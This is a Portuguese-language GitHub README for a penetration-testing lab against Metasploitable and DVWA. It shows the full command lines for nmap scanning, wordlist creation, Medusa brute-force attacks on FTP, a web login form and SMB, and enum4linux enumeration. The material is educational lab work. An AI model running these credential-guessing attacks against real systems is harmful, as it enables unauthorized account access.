<a href="https://fontmeme.com/fonts/architek-font/"><img src="https://fontmeme.com/permalink/260318/6682c71f.png" alt="architek-font" border="0"></a>


# 🔐 Projeto de Brute Force com Medusa no Kali Linux

## 📌 Descrição

Este projeto demonstra a utilização da ferramenta **Medusa** para execução de ataques de força bruta em diferentes serviços, utilizando o sistema operacional **Kali Linux**. O objetivo é apresentar técnicas básicas de auditoria de segurança, incluindo enumeração de serviços, criação de wordlists e execução de ataques controlados em ambientes de teste.

> ⚠️ **Aviso:** Este projeto é apenas para fins educacionais e deve ser utilizado exclusivamente em ambientes autorizados.

---

## 🛠️ Ferramentas Utilizadas

### 🔹 Medusa

O **Medusa** é uma ferramenta de força bruta rápida, modular e altamente paralela, projetada para testar autenticações remotas.

**Principais funcionalidades:**

* Testes paralelos baseados em threads
* Suporte a múltiplos hosts, usuários e senhas simultaneamente
* Entrada de dados flexível (arquivos ou inputs diretos)
* Arquitetura modular (arquivos `.mod` para cada serviço)

---

### 🔹 Kali Linux

O **Kali Linux** é uma distribuição Linux baseada em Debian voltada para testes de segurança.

**Destaques:**

* Centenas de ferramentas de pentest integradas
* Suporte a múltiplas plataformas
* Foco em segurança ofensiva, perícia e análise de vulnerabilidades

---

## 🎯 Etapas do Projeto

### 0. 🖥️ Criando as Máquinas

<p align="center">
  <img src="assents/img/Metasploitable.png" width="300"/>
  <img src="assents/img/Kali Linux.png" width="300">
</p>

### 1. 🔍 Enumeração de Portas

Verificando quais portas estão abertas no host alvo:

```bash
nmap -sV -p 21,22,23,139,445 192.168.1.101
```
![Verificando Portas](assents/img/Portas%20Abertas.png)

---

### 2. 📄 Criação de Wordlists

#### 👤 Lista de Usuários

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

#### 🔑 Lista de Senhas

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

![WordLists_Usuarios](assents/img/Wordlists.png)

---

### 3. 💥 Ataque FTP com Medusa

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```
![Ataque](assents/img/Ataque%20FTP.png)

---

### 4. 🌐 Ataque a Formulário Web (DVWA)

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

![Ataque_DVWA](assents/img/http.png)

![Ataque_DVWA](assents/img/http2.png)

---

---

### 4.1 🌐 Testando Acesso (DVWA)

![Acesso_DVWA](assents/img/Acesso%20http.png)

---

### 5. 🏢 Enumeração SMB (Ambiente Corporativo)

Coletando usuários via enumeração:

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```
![Coletando_usuarios](assents/img/Config1.png)

Visualizando resultados:

```bash
less enum4_output.txt
```

![Acesso_DVWA](assents/img/Abrindo%20Arquivo.png)

---

### 6. 📄 Wordlists para SMB

#### 👤 Usuários SMB

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
```

#### 🔑 Senhas SMB

```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

---

### 7. 💣 Ataque SMB com Medusa

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

![Ataque_SMB](assents/img/Wordlist%20e%20medusa.png)
---

### 8. ✅ Verificação de Acesso

Verificando se o usuário possui acesso administrativo:

```bash
smbclient -L //192.168.56.102 -U msfadmin
```
![Acesso_SMB](assents/img/teste%20de%20acesso.png)
---

## 📚 Conceitos Abordados

* Brute Force Attack
* Enumeração de serviços
* Wordlists personalizadas
* Ataques em FTP, HTTP e SMB
* Testes de segurança em ambientes controlados

---

## 🔗 Links

- [Medusa](https://man.archlinux.org/man/extra/medusa/medusa.1.en)
- [Nmap](https://nmap.org/book/)
- [Kali Linux](https://www.kali.org/docs/)



---


---

## 👨‍💻 Autor

**Carlos Lopes**  
💻 Analista de Segurança / Pentester  <br>
🔗 GitHub: https://github.com/Car-Lopes <br>
📧 Email: car.l1991@yahoo.com.br

---
